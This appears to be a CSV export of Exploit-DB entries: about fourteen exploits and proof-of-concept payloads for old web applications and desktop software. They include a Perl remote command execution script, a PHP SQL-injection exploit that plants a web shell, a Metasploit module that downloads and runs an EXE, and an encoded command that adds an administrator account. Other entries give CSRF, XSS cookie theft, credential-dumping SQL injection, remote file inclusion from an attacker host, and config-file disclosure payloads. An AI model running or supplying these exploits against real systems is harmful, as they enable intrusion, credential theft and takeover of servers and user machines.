19691,"Tony Greenwood WebWho+ 1.1 - Remote Command Execution source: https://www.securityfocus.com/bid/892/info  WebWho+ is a free cgi script written by Tony Greenwood for executing whois queries via the www. Though it does perform checks for shell escape characters on some parameters, it misses the 'type' variable and allows for malicious input to be sent to a shell. It is possible to execute arbitrary commands on a webserver running WebWho+ v1.1 with the uid of the webserver (usually nobody).   #!/usr/bin/perl # # hhp-webwho.pl # WebWho+ v1.1 (whois cgi) remote exploit. # # By: loophole of hhp. # [12/26/99] # # http://hhp.perlx.com/ # loophole@hhp.perlx.com # # Advisrory: http://hhp.perlx.com/ouradvisories/hhp-webwho.txt  use IO::Socket;  if (@ARGV < 2)  {   print ""* hhp-webwho.pl\n"";   print ""* webwho.pl (whois cgi) remote exploit.\n"";   print ""* By: loophole of hhp.\n"";   print ""* loophole\@hhp.perlx.com\n"";   print ""* http://hhp.perlx.com/\n\n"";   print ""USAGE: $0 <Server> [-e <File Extention>] <Command>\n\n"";   print ""* Server         = www.example.com\n"";   print ""* File Extension = /cgi-bin/webwho.pl\n"";   print ""* Command        = Shell command\n\n"";   print ""* NOTE: Defualt <File Extension> is /cgi-bin/webwho.pl\n"";   print ""*       It only needs changing if it is not the defualt.\n\n"";   print ""* EXAMPLE: $0 www.gat.org id\n"";   print ""*      OR: $0 www.gat.org -e /jack/webwho.pl id\n"";   exit 0;  }  if ($ARGV[1] eq ""-e"")  {   if (@ARGV != 4)    {     print ""Invalid Usage!\n"";     exit 0;    }   $server     = $ARGV[0];   $saywhatnig = $ARGV[2];   $command    = $ARGV[3];  }   else    {     if (@ARGV == 2)      {       $server     = $ARGV[0];       $command    = $ARGV[1];       $saywhatnig = ""/cgi-bin/webwho.pl"";      }    }  $sock = IO::Socket::INET->new(PeerAddr => $server,                               PeerPort => 80,                                  Proto => ""tcp"") or die ""Wack connection.\n"";  $calkuhlashun = 45 + length($command);    print $sock ""POST $saywhatnig HTTP/1.1\n"";   print $sock ""Accept-Language: en-us\n"";   print $sock ""Host: $server\n"";   print $sock ""Content-Length: $calkuhlashun\n"";   print $sock ""Connection: Keep-Alive\n\n"";   print $sock 'command=X&type="";echo fukk;';   print $sock ""$command"";   print $sock "";echo fokk&Check=X\n"";   $doot = 0;    while(<$sock>)    {     s/\n//g;     s/fukk<br>/--------Exploit Stats------------/;     s/fokk<br>/-hhpfoelife-\n/;     s/<br>//g;     $foo = $_;       if ($foo =~ /---Ex/)       {        $doot = 1;       }       if ($foo =~ /-hhpfoelife-/)       {        $doot = 0;        print ""---------------------------------\n"";        exit 0;       }       if ($doot == 1)        {        print ""$foo\n"";       }      } exit 0;",remote,remote,1
1652,"ADODB < 4.70 (PHPOpenChat 3.0.x) - 'Server.php' SQL Injection #!/usr/bin/php -q -d short_open_tag=on <? echo ""PhpOpenChat 3.0.x ADODB Server.php \""sql\"" SQL injection\r\n""; echo ""by rgod rgod@autistici.org\r\n""; echo ""site: http://retrogod.altervista.org\r\n\r\n""; echo ""dork: Welcome to your PHPOpenChat-Installation!\r\n\r\n"";  if ($argc<4) { echo ""Usage: php "".$argv[0]."" host path cmd OPTIONS\r\n""; echo ""host:      target server (ip/hostname)\r\n""; echo ""path:      path to PhpOpenChat\r\n""; echo ""cmd:       a shell command\r\n""; echo ""Options:\r\n""; echo ""   -p[port]:    specify a port other than 80\r\n""; echo ""   -P[ip:port]: specify a proxy\r\n""; echo ""Examples:\r\n""; echo ""php "".$argv[0]."" localhost /chat/ \r\n""; echo ""php "".$argv[0]."" localhost /chat/ ls -la -p81\r\n""; echo ""php "".$argv[0]."" localhost / ls -la -P1.1.1.1:80\r\n""; die; } /*  this is based on   https://www.securityfocus.com/bid/16187   but... look at the server.php source code:  ... $driver = 'mysql'; $host = 'localhost'; // DSN for odbc $uid = 'root'; $pwd = ''; $database = 'test'; ...  you need a ""root"" user with no password, an existent ""test"" database and Mysql to have certain rights to write files... so, this vulnerability is very hard to exploit however, here is the code for PhpOpenChat, you can easily change it to work against the program you want 									      */ error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; }  $host=$argv[1]; $path=$argv[2]; $action=$argv[3]; $cmd="""";$port=80;$proxy="""";  for ($i=3; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } $cmd=urlencode($cmd);  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  #step 1->read DOCUMENT ROOT from phpinfo $packet =""GET "".$p.""include/adodb/tests/tmssql.php?do=phpinfo HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); $temp=explode(""DOCUMENT_ROOT </td><td class=\""v\"">"",$html); $temp2=explode("" </td></tr>"",$temp[1]); $fullpath=$temp2[0]; $fullpath=trim($fullpath); echo ""DOCUMENT ROOT ->"".$fullpath.""\r\n\r\n""; $fullpath=str_replace(""\\"",""\\\\\\\\"",$fullpath); // win boxes if ($fullpath=="""") { echo $html; die(""\r\n\r\nCannot read phpinfo ...\r\n""); }  #step 2->execute a query (you can regardless of magic_quotes_gpc) $SQL =""SELECT '<?php echo chr(0x2a).\""delim*\"";passthru(\$_GET[\""cmd\""]);echo chr(0x2a).\""delim*\"";?>',0,0,0,0,0 ""; $SQL.=""INTO DUMPFILE '"".$fullpath.""/suntzu.php' FROM poc.poc_user_account LIMIT 1""; $SQL=urlencode($SQL); $packet =""GET "".$p.""include/adodb/server.php?sql=$SQL HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""Access denied"") || !strstr($html,""200 OK"") || strstr($html,""Can't connect"")) { echo $html; die(""\r\n\r\nExploit failed...\r\n""); } sleep(1); #step 3->launch commands $packet =""GET /suntzu.php?cmd="".$cmd."" HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (!strstr($html,""*delim*"")) { echo $html; die(""\r\n\r\nExploit failed...\r\n""); } else { echo ""Exploit succeeded...\r\n""; $temp=explode(""*delim*"",$html); echo $temp[1]; } ?>  # milw0rm.com [2006-04-09]",remote,webapps,1
12651,"Lokomedia CMS - 'sukaCMS' Local File Disclosure # Software Link: http://bukulokomedia.com # Version: [2.0] # Tested on: [all OS]  [+] Title : Local File Disclosure Vulnerability Lokomedia CMS (sukaCMS)  [+] Vendor     : http://bukulokomedia.com  [+] Discovered : vir0e5 a.k.a banditc0de  [+] Contact    : vir0e5[at]hackermail[dot]com  [+] Site       : http://vir0e5.blogspot.com  [+] DorK       : inurl:/downlot.php?file=   [+] Exploit    : http://[host]/[dir]/downlot.php?file=../config/koneksi.php  [+] Greetings  :[ mywisdom - kiddies - kamtiez - r3m1ck - Aoc - skuteng_boy  - blue_screen -                    agdi_cool - dangercode14045 - dewancc and YOU!!!! ] ;  [+] Forum [as member] : http://indonesian-cyber.org | http://tecon-crew.org | http://u3dcrew.darkbb.com | http://devilzc0de.org  [+] Notice : ""boycott malaysian product "" * Fuck to Malaysia <= the truly thief asia   * For HaMaDa SCoOoRPioN are you layz????? copy my exploit???   http://securityreason.com/securityalert/7161     http://securityreason.com/exploitalert/7413   Look Date!!! your copy my style!!!",local,webapps,1
11226,"Joomla! Component com_biographies - SQL Injection #-------------------------------------------------------- #Joomla (com_biographies) SQL injection Vulnerability #-------------------------------------------------------- #Discovered By: Snakespc     ALGERIAN HaCkEr  #Mail: snakespc@gmail.com  #site:anti-sec.info/vb/index.php       #------------------------------------------------------- #Dork:inurl""com_biographies"" #Exploit: #-------- #Demo: #http://server/index.php?option=com_biographies&task=showFile&biobookid=-5+union+all+select+1,2,3,concat(username,0x3a,password)+from+jos_users--",remote,webapps,1
7623,"Megacubo 5.0.7 - 'mega://' Remote 'eval()' Injection <!-- Megacubo 5.0.7 (mega://) remote eval() injection exploit by Nine:Situations:Group::pyrokinesis site: http://retrogod.altervista.org/  tested against Internet Explorer 8 beta 2/xp sp 3  software site: http://www.megacubo.net/tv/ download url: http://sourceforge.net/project/showfiles.php?group_id=231636&package_id=280849&release_id=608023  description: ""Megacubo is a IPTV tuner application written in PHP + Winbinder. It has a catalogue of links of TV streams which are available for free in the web. At the moment it only runs on Windows(2000, XP and Vista)."" (note that it is among most downloaded apps on sourceforge, http://sourceforge.net/softwaremap/trove_list.php?form_cat=99)  explaination: it's possible to pass arbitrary php code to the ""play"" command of ""mega://"" uri handler which is further copied to the c:\DATASTORE.txt temporary file and evaluated, note the ""con"" argument (which is a windows device name) to bypass a file_exists() check  example exploit, this run calc.exe:  mega://play|con..""a()"".system(base64_decode('Y21kIC9jIHN0YXJ0IGNhbGM=')).""/?"");print(  the following one execute: cmd /c NET USER pyrokinesis pass /ADD && NET LOCALGROUP Administrators /ADD pyrokinesis -->  <a href='mega://play|con..""a()"".system(base64_decode(Y21kIC9jIE5FVCBVU0VSIHB5cm9raW5lc2lzIHBhc3MgL0FERCAmJiBORVQgTE9DQUxHUk9VUCBBZG1pbmlzdHJhdG9ycyAvQUREIHB5cm9raW5lc2lz)).""/?"");print('>pwn</a>  # milw0rm.com [2008-12-30]",remote,remote,1
27322,"Woltlab Burning Board 1.1.1/2.x - 'galerie_index.php?Username' Cross-Site Scripting source: https://www.securityfocus.com/bid/16843/info  Woltlab Burning Board is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/21new/galerie_index.php?action=count&gal_catid=5&tcase=2&gal_id=35&userid=1&username=""><script>alert(document.cookie)</script>",remote,webapps,1
44137,"Front Accounting ERP 2.4.3 - Cross-Site Request Forgery <!-- ​​# Exploit Title: Front Accounting ERP 2.4.3 - CSRF # Date: 16-02-2018 # Exploit Author: Samrat Das # Contact: http://twitter.com/Samrat_Das93 # Website: https://securitywarrior9.blogspot.in/ # Vendor Homepage: frontaccounting.com # Version: 2.4.3 # CVE : CVE-2018-7176 # Category: WebApp ERP  1. Description  The application source code is coded in a way which allows malicious crafted HTML page to be executed directly without any anti csrf countermeasures.  2. Proof of Concept  1.       Visit the application 2.       Visit the User Permissions Page. 3.        Goto add user, and create a csrf crafted exploit for the same , upon hosting it on a server and sending the link to click by victim, it gets exploited.  Proof of Concept  Steps to Reproduce:  1. Create an HTML Page with the below exploit code: -->  <html>  <body>     <form action="" http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml"" method=""POST"" enctype=""text/plain"">       <input type=""hidden"" name=""show&#95;inactive"" value=""&user&#95;id&#61;Newadmin&password&#61;Newadmin&real&#95;name&#61;New&#37;20Admin&phone&#61;&email&#61;&role&#95;id&#61;8&language&#61;C&pos&#61;1&print&#95;profile&#61;&rep&#95;popup&#61;1&ADD&#95;ITEM&#61;Add&#37;20new&&#95;focus&#61;user&#95;id&&#95;modified&#61;0&&#95;confirmed&#61;&&#95;token&#61;Ta6aiT2xqlL2vg8u9aAvagxx&&#95;random&#61;757897&#46;6552143205"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>  <!-- 2  This hosted page upon being clicked by an logged in admin user will lead to creation of a new malicious admin user.  3 POCs and steps: https://securitywarrior9.blogspot.in/2018/02/cross-site-request-forgery-front.html  4. Solution:  Implement anti csrf token code in state changing http requests and validate it at server side. -->",remote,webapps,1
46815,"Zoho ManageEngine ADSelfService Plus 5.7 < 5702 build - Cross-Site Scripting [+] Zoho ManageEngine ADSelfService Plus 5.7 < 5702 build - Multiple Cross-Site Scripting [+] Author: Ibrahim Raafat [+] Twitter: https://twitter.com/RaafatSEC [+] Download: https://www.manageengine.com/products/self-service-password/download-free.html?   [+] TimeLine 	[-] Nov 23, 2018	Reported 	[-] Nov 26, 2018	Triaged 	[-] Dec 27, 2018 	Fixed 	[-] May 08, 2019	Public Disclosure  [+] Description: 	Zoho ManageEngine ADSelfService Plus 5.7 before build 5702 has Multiple XSS vulnerabilites  [+] POC  [-] Employee search form  POST /EmployeeSearch.cc?actionId=Search HTTP/1.1  searchString=dddddffff"");a=alert,a(31337)//&&searchType=contains&searchBy=ALL_FIELDS333');a=alert,a(31337)//&adscsrf= searchType parameter: searchString=a&searchType=containss9ek"";a=alert,a(31337)//&searchBy=ALL_FIELDS&adscsrf=   2- Employee Search – ascending parameter  /EmployeeSearch.cc?actionId=showList&searchBy=ALL_FIELDS&searchType=contains&PAGE_NUMBER=37&FROM_INDEX=22&TO_INDEX=22&RANGE=100&navigate=true&navigationType=&START_INDEX=22 HTTP/1.1  selOUs=&genID=12191&ACTIVE_TAB=user&sortIndex=0&ascending=true’;a=alert,a(31337)//&&searchString=a&TOTAL_RECORDS=22&adscsrf=   3- EmpSearch.cc - searchString parameter  POST /EmpSearch.cc?operation=getSearchResult&REQUEST_TYPE=JSON&searchString=RR<svg%2fonload%3dprompt(8)>&searchType=contains&searchBy=ALL_FIELDS&actionId=Search HTTP/1.1  &adscsrf=  4- Stored XSS in self-update layout implementation.  /SelfService.do?methodToCall=selfService&selectedTab=UpdateFields Insert the following payload into Mobile Number field, and save Payload: 11111111]"";a=alert,a(31337)// Code execute here: /Enrollment.do?selectedTab=Enrollment   [+] Assigned CVE:  CVE-2018-20484,CVE-2018-20485 [+] Release Notes: https://www.manageengine.com/products/self-service-password/release-notes.html",remote,webapps,1
22167,vAuthenticate 2.8 - SQL Injection source: https://www.securityfocus.com/bid/6605/info  A vulnerability has been discovered in vAuthenticate. It has been reported that various PHP scripts used by vAuthenticate are prone to SQL injection attacks. This issue may be exploited by an unauthorized attacker to view protected web pages.  An attacker that is able to access protected web pages may gain sensitive information that may aid in launching further attacks against a target server.  http://www.example.org/chgpwd.php?USERNAME=[username]&PASSWORD='%20OR%20''=' http://www.example.org/admin/index.php?USERNAME='%20OR%20''='&PASSWORD='%20OR%201=1%20AND%20level='1,remote,webapps,1
10259,"Ciamos CMS 0.9.5 - 'module_path' Remote File Inclusion    [ Discovered by cr4wl3r \ cr4wl3r[4t]linuxmail[dot]org ]  ######################################################################## #Ciamos CMS <= 0.9.5 (module_path) Remote File Include Vulnerability #Download Script      :  http://sourceforge.net/projects/ciamosmodules/files/ #Dork                 :  die(""Hacking attempt"");  :D ######################################################################## # #Vuln : ./ciamos/modules/pms/index.php (line 13) #       <?php #          include_once($module_path.'include/header.php');  #       ?> #PoC  :  http://server/modules/pms/index.php?module_path=http://[attacker]/shell.txt??? # ######################################################################## ######################################################################## ####################[90r0nt4l0 und3r9r0nd c0mmun1ty]#################### ######################################################################## ########################################################################       [ Gorontalo / 2009 ]",remote,webapps,1
28916,"America Online ICQ 5.1 - ActiveX Control Remote Code Execution source: https://www.securityfocus.com/bid/20930/info  The America Online ICQ ActiveX Control is prone to a remote code-execution vulnerability.   An attacker could exploit this issue simply by sending a message to a victim ICQ user. Successful exploits could allow the attacker to execute arbitrary code.  The ICQPhone.SipxPhoneManager ActiveX control with the following CLSID is affected:  54BDE6EC-F42F-4500-AC46-905177444300  ## # This file is part of the Metasploit Framework and may be subject to  # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/projects/Framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'America Online ICQ ActiveX Control Arbitrary File Download and Execute.', 			'Description'    => %q{ 				This module allows remote attackers to download and execute arbitrary files 				on a users system via the DownloadAgent function of the ICQPhone.SipxPhoneManager ActiveX control.  			}, 			'License'        => 'MSF_LICENSE', 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision:$', 			'References'     =>  				[ 					[ 'CVE', '2006-5650' ], 					[ 'BID', '20930' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-037/' ], 				], 			'Payload'        => 				{ 					'Space'           => 2048, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 	  				[ 'Automatic', { } ], 				], 			'DisclosureDate' => 'Nov 6, 2006', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('URIPATH', [ true, ""The URI to use."", ""/"" ]) 				], self.class)  	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request)  		payload_url =  ""http://"" 		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		payload_url += "":"" + datastore['SRVPORT'] + get_resource() + ""/PAYLOAD""  		if (request.uri.match(/PAYLOAD/)) 			return if ((p = regenerate_payload(cli)) == nil) 			data = Rex::Text.to_win32pe(p.encoded, '')  			print_status(""Sending EXE payload to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 			return 		end  		vname  = rand_text_alpha(rand(100) + 1) 		exe    = rand_text_alpha_upper(rand(5) + 1)  		content = %Q| 	<html> 		<head> 			<script> 				try { 					var #{vname} = new ActiveXObject('ICQPhone.SipxPhoneManager.1'); 					#{vname}.DownloadAgent(""#{payload_url}/#{exe}.exe""); 				} catch( e ) { window.location = 'about:blank' ; } 			</script> 		</head> 	</html> 				|  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		send_response_html(cli, content) 	 		handler(cli) 		 	end end",remote,remote,1
35622,"Wickr Desktop 2.2.1 Windows - Denial of Service Document Title: =============== Wickr Desktop v2.2.1 Windows - Denial of Service Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1377  Video:  http://www.vulnerability-lab.com/get_content.php?id=1388    Release Date: ============= 2014-12-25   Vulnerability Laboratory ID (VL-ID): ==================================== 1377   Common Vulnerability Scoring System: ==================================== 3.3   Product & Service Introduction: =============================== Wickr (pronounced `wicker`) is a proprietary instant messenger for iPhone and Android. Wickr allows users to exchange end-to-end encrypted and  self-destructing messages, including photos and file attachments. The `self-destruct` part of the software is designed to use a `Secure File Shredder`  which the company says `forensically erases unwanted files you deleted from your device`. However the company uses a proprietary algorithm to manage  the data, a practice which is prone to error according to many security experts.  On January 15, 2014, Wickr announced it is offering a US$100,000 bug bounty for those who find vulnerabilities that significantly impact users. In addition,  a recipient can in general use other software and techniques like screen-capture capabilities or a separate camera to make permanent copies of the content.  (Copy of the Homepage: https://wickr.com/ )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research team discovered a denial of service web vulnerability in the offical Wickr Desktop v2.2.1 windows software.   Vulnerability Disclosure Timeline: ================================== 2014-12-25:	Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Wickr Inc. Product: Wickr - Desktop Software (Windows) 2.2.1   Exploitation Technique: ======================= Local   Severity Level: =============== Medium   Technical Details & Description: ================================ A local denial of service vulnerability has been discovered in the official Wickr TSM v2.2.1 (MSI) windows software. The issue allows local attackers to crash or shutdown the software client by usage of special crafted symbole payloads.  The wickr v2.2.1 (msi) software crashs with unhandled exception in the CFLite.dll by the qsqlcipher_wickr.dll when processing to include  special crafted symbole strings  as password or name. The issue occurs after the input of the payload to the `change name friend contacts`-, `the wickr password auth`-  and the `friends > add friends` input fields. Attackers are able to change the name value of the own profile (payload) to crash the  wickr client. Local attackers can include the payload to the input fields to crash/shutdown the application with unhandled exception.  The security risk of the denial of service vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.3.  Exploitation of the DoS vulnerability requires a low privileged application user account and low user interaction. Successful exploitation of  the vulnerability results in an application crash or service shutdown.   Vulnerable Module(s): 				[+] friend contacts 				[+] wickr password auth 				[+] friends  Vulnerbale Input(s): 				[+] add friends (name) 				[+] wickr password auth 				[+] change friend (update name)  Vulnerable Parameter(s): 				[+] name (value input) 				[+] password (vale input)   Proof of Concept (PoC): ======================= The denial of service web vulnerability can be exploited by remote attackers and local attackers with low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   Manual steps to reproduce the vulnerability ... 1. Download Wickr v2.2.1 for windows to your windows 8 box (mywickr.info/download.php?p=4)  2. Install the wickr windows version of the software to your windows 8 box 3. Create an new account and include the payload to the password input field Note: After the payload has been processed to the auth, the software crashs. You should attach a debugger ago. 4. Successful reproduce of the first issue! 5. We register a new account with regular values 6. Open the friends > add friends section and include the payload to the search input value Note: After the payload has been processed to add the friend, the software crashs. You should attach a debugger ago. 7. Successful reproduce of the second issue! 8. We open the software again and login. Switch to the existing friends contacts and edit the profile 9. Include in the name values the payload and save the settings Note: After the payload has been processed to change to the name, the software crashs. You should attach a debugger ago. 4. Successful reproduce of the third issue!   Payload: Denial of Service ็¬็ส็็็็็ -็็็็็็็็็็็็็็็็็็็็ส็¬็็็็็็็็¬็็็็็็็็็็็็็็็็ส็็็็¬็็็็็็็็็-็็็็็็็ ็็็็็ส็็็็็็็¬็็็็็็็็็็¬็็็็็็็็ส็็็็็็็็็็¬็็็็็็็็็็็ ¬็็็็ส็็็็็็็็็็็็็¬็็็็ ็็็็็็็็¬ส็็็็็็็็็็็็็็็็-็็็็็็็็็ส็็็็็็็็็็็็็็็็็็็ ¬็็็็็็ส็็็็็็็¬ส็็็็็็็็็็็็็็็็็็็็็็็็็ส็็็¬¬็็็็็็็็็็็็็็็็็็็็็็ส็็็็็็¬็    --- Error Report Logs --- EventType=APPCRASH EventTime=130628671359850105 ReportType=2 Consent=1 UploadTime=130628671360390638 ReportIdentifier=df89d941-8208-11e4-be8b-54bef733d5e7 IntegratorReportIdentifier=df89d940-8208-11e4-be8b-54bef733d5e7 WOW64=1 NsAppName=Wickr.exe Response.BucketId=96ac0935c87e28d0d5f61ef072fd75b8 Response.BucketTable=1 Response.LegacyBucketId=73726044048 Response.type=4 Sig[0].Name=Anwendungsname Sig[0].Value=Wickr.exe Sig[1].Name=Anwendungsversion Sig[1].Value=0.0.0.0 Sig[2].Name=Anwendungszeitstempel Sig[2].Value=02849d78 Sig[3].Name=Fehlermodulname Sig[3].Value=CFLite.dll Sig[4].Name=Fehlermodulversion Sig[4].Value=0.0.0.0 Sig[5].Name=Fehlermodulzeitstempel Sig[5].Value=53f6c178 Sig[6].Name=Ausnahmecode Sig[6].Value=c0000005 Sig[7].Name=Ausnahmeoffset Sig[7].Value=00027966 DynamicSig[1].Name=Betriebsystemversion DynamicSig[1].Value=6.3.9600.2.0.0.256.48 DynamicSig[2].Name=Gebietsschema-ID DynamicSig[2].Value=1031 DynamicSig[22].Name=Zusatzinformation 1 DynamicSig[22].Value=5861 DynamicSig[23].Name=Zusatzinformation 2 DynamicSig[23].Value=5861822e1919d7c014bbb064c64908b2 DynamicSig[24].Name=Zusatzinformation 3 DynamicSig[24].Value=84a0 DynamicSig[25].Name=Zusatzinformation 4 DynamicSig[25].Value=84a09ea102a12ee665c500221db8c9d6 UI[2]=C:\Program Files (x86)\Wickr Inc\Wickr - Top Secret Messenger\Wickr.exe UI[3]=Wickr.exe funktioniert nicht mehr UI[4]=Windows kann online nach einer Lösung für das Problem suchen. UI[5]=Online nach einer Lösung suchen und das Programm schließen UI[6]=Später online nach einer Lösung suchen und das Programm schließen UI[7]=Programm schließen ... ...  ... ... LoadedModule[103]=C:\Program Files (x86)\Wickr Inc\Wickr - Top Secret Messenger\sqldrivers\qsqlcipher_wickr.dll State[0].Key=Transport.DoneStage1 State[0].Value=1 FriendlyEventName=Nicht mehr funktionsfähig ConsentKey=APPCRASH AppName=Wickr.exe AppPath=C:\Program Files (x86)\Wickr Inc\Wickr - Top Secret Messenger\Wickr.exe NsPartner=windows NsGroup=windows8 ApplicationIdentity=6A5425CE651532265F599A5A86C6C2EE    Security Risk: ============== The security risk of the denial of service web vulnerability in the wickr windows client software is estimated as medium. (CVSS 3.3)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2014 | Vulnerability Laboratory - [Evolution Security GmbH]™   --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt",remote,dos,1
25953,"Comersus Open Technologies Comersus Cart 6.0.41 - Multiple SQL Injections source: https://www.securityfocus.com/bid/14183/info  Comersus Cart is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/comersus6/store/comersus_optAffiliateRegistrationExec.asp?name=1&email='&Submit=Join%20now%21 http://www.example.com/comersus6/store/comersus_optReviewReadExec.asp?idProduct='&description=",remote,webapps,1
35460,"WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download # Exploit Title: Wordpress CodeArt Google MP3 Player plugin - File Disclosure Download  # Google Dork: inurl:/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=  # Date: 02/12/2014  # Exploit Author: QK14 Team  # Vendor Homepage: https://wordpress.org/plugins/google-mp3-audio-player/  # Software Link: https://wordpress.org/plugins/google-mp3-audio-player/  # Version: 1.0.11  # http://wordpressa.quantika14.com/repository/index.php?id=14     Descripci�n:     Este plugin es vulnerable a File Disclosure Download.  Gracias a esta vulnerabilidad, un usuario podr� descargar el archivo de configuraci�n config.php y extraer de �l los datos de acceso a la Base de Datos.     POF:  localhost/wordpress/wp-content/plugins/google-mp3-audio-player/direct_downlo ad.php?file=../../../wp-config.php",remote,webapps,1
